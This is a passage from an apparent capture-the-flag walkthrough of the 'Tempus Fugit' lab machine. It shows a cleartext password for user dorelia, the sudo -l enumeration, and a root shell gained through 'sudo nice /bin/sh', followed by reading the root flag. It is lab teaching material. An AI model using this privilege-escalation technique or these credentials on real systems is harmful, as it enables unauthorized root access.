dorelia:9p4lw0r82xg5

From admin@mofo.pwn Tue Aug 13 13:00:57 2019
Return-path: <admin@mofo.pwn>
Envelope-to: someuser@localhost
Delivery-date: Tue, 13 Aug 2019 13:00:57 +0200
Received: from root by nancy.mofo.pwn with local (Exim 4.92)
    (envelope-from <admin@mofo.pwn>)
    id 1hXUXx-0001rv-1P
    for someuser@localhost; Tue, 13 Aug 2019 13:00:57 +0200
Subject: Remember...
From: admin@mofo.pwn
To: <someuser@localhost>
X-Mailer: mail (GNU Mailutils 3.5)
Message-ID: <E1hXUXx-0001rv-1P@nancv.mofo.pwn>


**Privilege Escalation **

We again used the su command to login as the newly found user named dorelia. Let’s use the sudo -l command to enumerate if this user can run some application with root privileges.

su dorelia
9p4lw0r82xg5
sudo -l


$ su dorelia
su dorelia
Password: 9p4lw0r82xg5

dorelia@nancy:/var/mail$ sudo -l
sudo -l
Matching Defaults entries for dorelia on nancy:
  env_reset, mail_badpass,
  secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/b

User dorelia may run the following commands on nancy:
  (ALL) NOPASSWD: /usr/bin/nice
dorelia@nancy:/var/mail$


Dorelia user can run the “nice” command as the Nancy user which we suppose have the root access. We need to find more about this “nice”. We used the help parameter to get some information about this command. At last, we checked the gtfobin for the nice command and found a way to escalate privileges using the nice command. So, we ran the nice command to invoke the sh shell with the sudo command. This gave us the root privileges.

nice --help
sudo nice /bin/sh
whoami


dorelia@nancy:/var/mail$ nice --help
nice --help
Usage: nice [OPTION] [COMMAND [ARG] ...]
Run COMMAND with an adjusted niceness, which affects process scheduling.
With no COMMAND, print the current niceness. Niceness values range from
-20 (most favorable to the process) to 19 (least favorable to the process).

Mandatory arguments to long options are mandatory for short options too.
  -n, --adjustment=N  add integer N to the niceness (default 10)
    --help    display this help and exit
    --version output version information and exit

NOTE: your shell may have its own version of nice, which usually supersedes
the version described here. Please refer to your shell's documentation
for details about the options it supports.

GNU coreutils online help: <https://www.gnu.org/software/coreutils/>
Full documentation at: <https://www.gnu.org/software/coreutils/nice>
or available locally via: info '(coreutils) nice invocation'
dorelia@nancy:/var/mail$ sudo nice /bin/sh
sudo nice /bin/sh
# whoami
whoami
root


**Reading Root Flag**

We traversed to the root directory to find the flag and we have a script here named proof.sh. We ran the script and it gave us the final flag.

cd /root/
ls
./proof.sh


# cd /root/
cd /root/
# ls
ls
proof.sh  scripts
# ./proof.sh
./proof.sh
'unknown': I need something more specific.

Tempus Fugit pwned ...

Proof: 305c941fe2d57c4063d256477df70ff1
Path: /root
Date: Wed 05 Feb 2020 11:55:34 AM CET
Whoami: root

I was gratified to be able to answer promptly, and I did. I said I didn't know.
-- Mark Twain
